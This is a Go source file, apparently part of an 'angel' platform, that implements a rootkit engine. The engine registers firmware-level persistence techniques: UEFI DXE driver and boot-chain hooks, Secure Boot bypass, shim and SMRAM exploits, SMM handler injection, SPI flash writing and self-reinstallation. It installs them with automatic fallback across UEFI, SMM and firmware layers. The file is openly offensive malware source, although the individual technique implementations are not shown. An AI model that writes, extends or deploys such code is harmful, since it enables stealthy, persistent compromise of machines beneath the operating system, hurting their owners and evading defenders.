package rootkit

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
	"github.com/angel-platform/angel/pkg/types"
)

type RootkitEngine struct {
	config    *RootkitConfig
	methods   map[RootkitTechnique]RootkitMethod
	mu        sync.RWMutex
	log       *logger.Logger
	platform  types.Platform
	fallback  []RootkitLayer
	installed map[RootkitTechnique]*RootkitResult
}

func NewRootkitEngine(config *RootkitConfig) *RootkitEngine {
	if config == nil {
		config = DefaultRootkitConfig()
	}

	e := &RootkitEngine{
		config:    config,
		methods:   make(map[RootkitTechnique]RootkitMethod),
		log:       logger.New("rootkit-engine", logger.LevelInfo),
		platform:  config.Platform,
		fallback:  []RootkitLayer{LayerUEFI, LayerSMM, LayerFirmware},
		installed: make(map[RootkitTechnique]*RootkitResult),
	}

	e.registerMethods()
	return e
}

func (e *RootkitEngine) registerMethods() {
	e.registerUEFIMethods()
	e.registerSMMMethods()
	e.registerFirmwareMethods()
}

func (e *RootkitEngine) registerUEFIMethods() {
	e.methods[TechniqueDXEDriver] = NewDXEDriverMethod()
	e.methods[TechniqueBootChainHook] = NewBootChainHookMethod()
	e.methods[TechniqueOSLHook] = NewOSLHookMethod()
	e.methods[TechniqueCMHook] = NewCMHookMethod()
	e.methods[TechniqueSecureBootBypass] = NewSecureBootBypassMethod()
	e.methods[TechniqueMOKEnroll] = NewMOKEnrollMethod()
	e.methods[TechniqueSelfReinstall] = NewUEFISelfReinstallMethod()
	e.methods[TechniqueESPPersistence] = NewESPPersistenceMethod()
	e.methods[TechniqueShimExploit] = NewShimExploitMethod()
}

func (e *RootkitEngine) registerSMMMethods() {
	e.methods[TechniqueHandlerInject] = NewHandlerInjectMethod()
	e.methods[TechniqueSMRAMExploit] = NewSMRAMExploitMethod()
	e.methods[TechniqueROPChain] = NewROPChainMethod()
	e.methods[TechniqueInterruptHook] = NewInterruptHookMethod()
	e.methods[TechniqueSMMSelfReinstall] = NewSMMSelfReinstallMethod()
}

func (e *RootkitEngine) registerFirmwareMethods() {
	e.methods[TechniqueSPIFlashRead] = NewSPIFlashReadMethod()
	e.methods[TechniqueSPIFlashWrite] = NewSPIFlashWriteMethod()
	e.methods[TechniqueJTAGDebug] = NewJTAGDebugMethod()
	e.methods[TechniqueUARTConsole] = NewUARTConsoleMethod()
	e.methods[TechniqueFirmwareEmulation] = NewFirmwareEmulationMethod()
}

func (e *RootkitEngine) Install(method RootkitTechnique) (*RootkitResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	m, ok := e.methods[method]
	if !ok {
		return nil, fmt.Errorf("unsupported rootkit technique: %s", method)
	}

	e.log.Info("Installing rootkit via %s (layer: %s)", method, m.Layer())

	result, err := m.Install(e.config)
	if err != nil {
		e.log.Error("Failed to install rootkit via %s: %v", method, err)
		return nil, fmt.Errorf("install failed: %w", err)
	}

	result.InstalledAt = time.Now()
	e.installed[method] = result

	e.log.Info("Rootkit installed successfully via %s", method)
	return result, nil
}

func (e *RootkitEngine) InstallWithFallback(preferredLayer RootkitLayer) (*RootkitResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	for _, layer := range e.fallback {
		if layer != preferredLayer {
			continue
		}

		for technique, method := range e.methods {
			if method.Layer() != layer {
				continue
			}

			e.log.Info("Attempting %s technique in %s layer", technique, layer)
			result, err := method.Install(e.config)
			if err != nil {
				e.log.Warn("Failed to install %s: %v", technique, err)
				continue
			}

			result.InstalledAt = time.Now()
			e.installed[technique] = result
			return result, nil
		}
	}

	for _, layer := range e.fallback {
		if layer == preferredLayer {
			continue
		}

		for technique, method := range e.methods {
			if method.Layer() != layer {
				continue
			}

			e.log.Info("Fallback: attempting %s technique in %s layer", technique, layer)
			result, err := method.Install(e.config)
			if err != nil {
				e.log.Warn("Fallback failed for %s: %v", technique, err)
				continue
			}

			result.InstalledAt = time.Now()
			e.installed[technique] = result
			return result, nil
		}
	}

	return nil, fmt.Errorf("all fallback techniques failed")
}

func (e *RootkitEngine) Remove(method RootkitTechnique) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	m, ok := e.methods[method]
	if !ok {
		return fmt.Errorf("unsupported rootkit technique: %s", method)
	}

	e.log.Info("Removing rootkit via %s", method)

	if err := m.Remove(e.config); err != nil {
		e.log.Error("Failed to remove rootkit via %s: %v", method, err)
		return fmt.Errorf("remove failed: %w", err)
	}

	delete(e.installed, method)
	e.log.Info("Rootkit removed successfully via %s", method)
	return nil
}

func (e *RootkitEngine) Verify(method RootkitTechnique) (bool, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	m, ok := e.methods[method]
	if !ok {
		return false, fmt.Errorf("unsupported rootkit technique: %s", method)
	}

	return m.Verify(e.config)
}

func (e *RootkitEngine) GetAvailableTechniques() []RootkitTechnique {
	e.mu.RLock()
	defer e.mu.RUnlock()

	techniques := make([]RootkitTechnique, 0, len(e.methods))
	for t := range e.methods {
		techniques = append(techniques, t)
	}
	return techniques
}

func (e *RootkitEngine) GetInstalled() map[RootkitTechnique]*RootkitResult {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make(map[RootkitTechnique]*RootkitResult)
	for k, v := range e.installed {
		result[k] = v
	}
	return result
}

func (e *RootkitEngine) GetTechniquesByLayer(layer RootkitLayer) []RootkitTechnique {
	e.mu.RLock()
	defer e.mu.RUnlock()

	var techniques []RootkitTechnique
	for t, m := range e.methods {
		if m.Layer() == layer {
			techniques = append(techniques, t)
		}
	}
	return techniques
}

func (e *RootkitEngine) SetFallbackChain(layers []RootkitLayer) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.fallback = layers
}

var TechniqueSMMSelfReinstall RootkitTechnique = "smm_self_reinstall"
